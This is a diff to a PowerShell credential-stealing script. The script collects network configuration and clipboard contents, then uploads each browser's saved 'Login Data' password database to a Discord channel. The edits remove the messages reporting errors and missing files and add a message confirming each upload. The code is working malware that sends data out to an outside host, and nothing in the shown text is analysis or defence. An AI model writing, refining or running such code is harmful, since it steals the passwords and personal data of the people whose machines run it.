@@ -69,7 +69,6 @@ try {
     Send-PayloadToDiscord -content "Network Configuration:`n$netConfig"
 } catch {
     Write-Host "Error extracting network configuration: $_"
-    Send-PayloadToDiscord -content "Error extracting network configuration: $_"
 }
 
 # Extract Clipboard Content
@@ -92,13 +91,11 @@ try {
         $loginData = "$env:LOCALAPPDATA\$browser\User Data\Default\Login Data"
         if (Test-Path $loginData) {
             Send-FileToDiscord -filePath $loginData -fileName "$browser_LoginData"
-        } else {
-            Send-PayloadToDiscord -content "Browser: $browser - No Login Data file found."
+            Send-PayloadToDiscord -content "Browser: $browser - Login Data file uploaded."
         }
     }
 } catch {
     Write-Host "Error extracting browser credentials: $_"
-    Send-PayloadToDiscord -content "Error extracting browser credentials: $_"
 }
 
 # List Files in My Documents
